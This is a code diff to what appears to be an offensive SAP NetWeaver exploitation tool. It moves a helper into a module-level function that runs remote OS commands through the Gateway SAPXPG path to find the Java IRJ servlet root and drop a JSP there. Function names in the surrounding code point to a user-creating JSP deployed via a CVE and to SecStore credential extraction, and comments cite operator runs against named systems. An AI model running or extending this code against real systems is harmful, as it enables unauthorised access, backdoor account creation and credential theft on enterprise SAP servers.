@@ -670,6 +670,103 @@ def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
 # Deployment path 2: via GW RFC SAPXPG OS exec (chunked)
 # ---------------------------------------------------------------------------
 
+def _extract_java_inst_nr(inst_dirname: str):
+    """Pull the two-digit NN out of "J00" / "JC01" / "JD20" — returns
+    None if the trailing chars aren't 2 digits (custom instance names)."""
+    m = re.search(r"(\d{2})$", inst_dirname)
+    return int(m.group(1)) if m else None
+
+
+def probe_java_root_dir(sid: str, linux: bool, exec_fn,
+                          java_instance_nr: int):
+    """Locate the actual Java Central Instance's IRJ servlet root on
+    the target filesystem.  Returns (root_path, discovered_inst_nr) or
+    (None, None) when no J/JC/JD instance owns an irj/servlet_jsp/irj/root.
+
+    The `discovered_inst_nr` value can differ from the SAPControl
+    instance passed in when the landscape has separate J<NN> (Java
+    Central) and SCS<NN> (Central Services) instances.  Operator
+    reports for THJ / SJJ / SJ1:
+      * SAPControl at port 50113 (inst 01) is SCS, but J Central is
+        J00 and IRJ lives under /usr/sap/THJ/J00/… — nr=01 misses.
+      * SAPControl at port 50313 (inst 03) on SJ1 is SCS, J Central
+        is J02 and IRJ lives at /usr/sap/SJ1/J02/…
+    Callers MUST use `discovered_inst_nr` to recompute the JSP URL
+    port (5NN00 for the ACTUAL Java NN) — otherwise the JSP lands on
+    disk but is unreachable.
+
+    `exec_fn` is a callable `(program, params) -> {success, exit_code,
+    output}` — same shape as `sapmap_exploit.execute_os_command`.
+    """
+    inst_candidates = [
+        f"J{int(java_instance_nr):02d}",
+        f"JC{int(java_instance_nr):02d}",
+        f"JD{int(java_instance_nr):02d}",
+    ]
+    if linux:
+        base = f"/usr/sap/{sid}"
+        for inst in inst_candidates:
+            root = (f"{base}/{inst}/j2ee/cluster/apps/sap.com/"
+                    f"irj/servlet_jsp/irj/root")
+            r = exec_fn("/usr/bin/test", f"-d {root}")
+            if r.get("success") and r.get("exit_code", 0) == 0:
+                return root, _extract_java_inst_nr(inst)
+        # Fallback: enumerate /usr/sap/<SID>/ and try each subdir.
+        r = exec_fn("/bin/ls", f"-1 {base}")
+        if r.get("success") and r.get("exit_code", 0) == 0:
+            subdirs = [ln.strip() for ln in
+                         (r.get("output") or []) if ln.strip()]
+            skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
+            subdirs = [d for d in subdirs
+                        if not any(d.startswith(s) for s in skip)]
+            subdirs.sort(
+                key=lambda d: (0 if d.startswith(("J", "JC"))
+                                else 1, d))
+            for inst in subdirs:
+                root = (f"{base}/{inst}/j2ee/cluster/apps/"
+                        f"sap.com/irj/servlet_jsp/irj/root")
+                r2 = exec_fn("/usr/bin/test", f"-d {root}")
+                if r2.get("success") and r2.get(
+                        "exit_code", 0) == 0:
+                    return root, _extract_java_inst_nr(inst)
+        return None, None
+    # Windows
+    base = fr"C:\usr\sap\{sid}"
+    for inst in inst_candidates:
+        root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
+                fr"\servlet_jsp\irj\root")
+        r = exec_fn("cmd.exe",
+                     f'/C if exist "{root}\\." (echo YES) '
+                     f'else (echo NO)')
+        out = " ".join(
+            str(l) for l in (r.get("output") or [])
+        ).strip().upper()
+        if "YES" in out:
+            return root, _extract_java_inst_nr(inst)
+    # Fallback: enumerate C:\usr\sap\<SID>\ and try each subdir.
+    r = exec_fn("cmd.exe", f'/C dir /B "{base}"')
+    out_lines = [ln.strip() for ln in (r.get("output") or [])
+                  if ln.strip()]
+    skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
+    subdirs = [d for d in out_lines
+                if not any(d.upper().startswith(s) for s in skip)]
+    subdirs.sort(
+        key=lambda d: (0 if d.upper().startswith(("J", "JC"))
+                        else 1, d))
+    for inst in subdirs:
+        root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
+                fr"\servlet_jsp\irj\root")
+        r2 = exec_fn("cmd.exe",
+                      f'/C if exist "{root}\\." (echo YES) '
+                      f'else (echo NO)')
+        out2 = " ".join(
+            str(l) for l in (r2.get("output") or [])
+        ).strip().upper()
+        if "YES" in out2:
+            return root, _extract_java_inst_nr(inst)
+    return None, None
+
+
 def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                     chunk_size: int = 100,
                                     tmp_dir: str = "",
@@ -703,111 +800,14 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         linux = _is_linux_target(node)
     os_label = "linux" if linux else "windows"
 
-    # Java instance folder naming varies across NW releases:
-    #   * J<NN>   — pure Java central instance (default)
-    #   * JC<NN>  — Java Central with SCS (7.4x pattern)
-    #   * JD<NN>  — Java dialog on some NW 7.5x installs
-    #   * SMDA<NN>, ERS<NN> — SCS / enqueue replication (never IRJ)
-    # The hard-coded J<NN> in _java_root_path fails on hosts using
-    # JC<NN>.  Probe candidates via `dir /b` (Win) / `ls` (Unix)
-    # before we spend 15-20 s writing 144 chunks — if we can't find
-    # a servlet_jsp/irj/root directory on ANY candidate, bail early
-    # with a clear error rather than dying at the certutil decode
-    # step (operator-reported: JAV/J02 on Windows returned
-    # PATH_NOT_FOUND from certutil).
-    def _extract_inst_nr(inst_dirname):
-        """Pull the two-digit NN out of "J00" / "JC01" / "JD20"
-        etc.  Returns None if the trailing chars aren't 2 digits —
-        happens for custom instance names.  Preserves the original
-        java_instance_nr as fallback in that case."""
-        import re as _re
-        m = _re.search(r"(\d{2})$", inst_dirname)
-        return int(m.group(1)) if m else None
-
-    def _probe_java_root(nr):
-        """Return (root_path, discovered_instance_nr) — the second
-        value can differ from the SAPControl instance passed in when
-        the operator's landscape has separate J<NN> (Java Central
-        Instance) and SCS<NN> (Central Services) instances.
-        Operator-reported: SAPControl at port 50113 = inst 01 (SCS),
-        but the Java Central Instance is J00 with IRJ under
-        /usr/sap/THJ/J00/... — so nr=01 misses and enumeration must
-        return the ACTUAL nr=0 so the JSP URL uses port 50000, not
-        50100 which is SCS's msg-server-related slot.
-        """
-        inst_candidates = [
-            f"J{int(nr):02d}",
-            f"JC{int(nr):02d}",
-            f"JD{int(nr):02d}",
-        ]
-        if linux:
-            base = f"/usr/sap/{sid}"
-            for inst in inst_candidates:
-                root = (f"{base}/{inst}/j2ee/cluster/apps/sap.com/"
-                        f"irj/servlet_jsp/irj/root")
-                r = exec_fn("/usr/bin/test", f"-d {root}")
-                if r.get("success") and r.get("exit_code", 0) == 0:
-                    return root, _extract_inst_nr(inst)
-            # Fallback: enumerate /usr/sap/<SID>/.  Real-world J
-            # Central Instances often use a different NN than the
-            # SAPControl-derived guess (SCS runs on inst 01, J
-            # Central on inst 00 — separate sapstartsrv per
-            # instance).
-            r = exec_fn("/bin/ls", f"-1 {base}")
-            if r.get("success") and r.get("exit_code", 0) == 0:
-                subdirs = [ln.strip() for ln in
-                             (r.get("output") or []) if ln.strip()]
-                skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
-                subdirs = [d for d in subdirs
-                            if not any(d.startswith(s) for s in skip)]
-                subdirs.sort(
-                    key=lambda d: (0 if d.startswith(("J", "JC"))
-                                    else 1, d))
-                for inst in subdirs:
-                    root = (f"{base}/{inst}/j2ee/cluster/apps/"
-                            f"sap.com/irj/servlet_jsp/irj/root")
-                    r2 = exec_fn("/usr/bin/test", f"-d {root}")
-                    if r2.get("success") and r2.get(
-                            "exit_code", 0) == 0:
-                        return root, _extract_inst_nr(inst)
-            return None, None
-        # Windows
-        base = fr"C:\usr\sap\{sid}"
-        for inst in inst_candidates:
-            root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
-                    fr"\servlet_jsp\irj\root")
-            r = exec_fn("cmd.exe",
-                         f'/C if exist "{root}\\." (echo YES) '
-                         f'else (echo NO)')
-            out = " ".join(
-                str(l) for l in (r.get("output") or [])
-            ).strip().upper()
-            if "YES" in out:
-                return root, _extract_inst_nr(inst)
-        # Fallback: enumerate C:\usr\sap\<SID>\ and try each subdir.
-        r = exec_fn("cmd.exe", f'/C dir /B "{base}"')
-        out_lines = [ln.strip() for ln in (r.get("output") or [])
-                      if ln.strip()]
-        skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
-        subdirs = [d for d in out_lines
-                    if not any(d.upper().startswith(s) for s in skip)]
-        subdirs.sort(
-            key=lambda d: (0 if d.upper().startswith(("J", "JC"))
-                            else 1, d))
-        for inst in subdirs:
-            root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
-                    fr"\servlet_jsp\irj\root")
-            r2 = exec_fn("cmd.exe",
-                          f'/C if exist "{root}\\." (echo YES) '
-                          f'else (echo NO)')
-            out2 = " ".join(
-                str(l) for l in (r2.get("output") or [])
-            ).strip().upper()
-            if "YES" in out2:
-                return root, _extract_inst_nr(inst)
-        return None, None
-
-    probed_root, probed_inst = _probe_java_root(java_instance_nr)
+    # Java instance folder naming varies across NW releases (J<NN>,
+    # JC<NN>, JD<NN>).  Delegates to module-level probe_java_root_dir
+    # so the SecStore runner (extract_java_secstore) shares the same
+    # enumeration — otherwise SecStore deploys land on disk at the
+    # wrong NN (SAPControl=SCS's inst, not Java Central's) and the
+    # JSP is unreachable even though the write succeeded.
+    probed_root, probed_inst = probe_java_root_dir(
+        sid, linux, exec_fn, java_instance_nr)
     if probed_root:
         target_path = probed_root + (("/" if linux else "\\")
                                        + jsp_name)
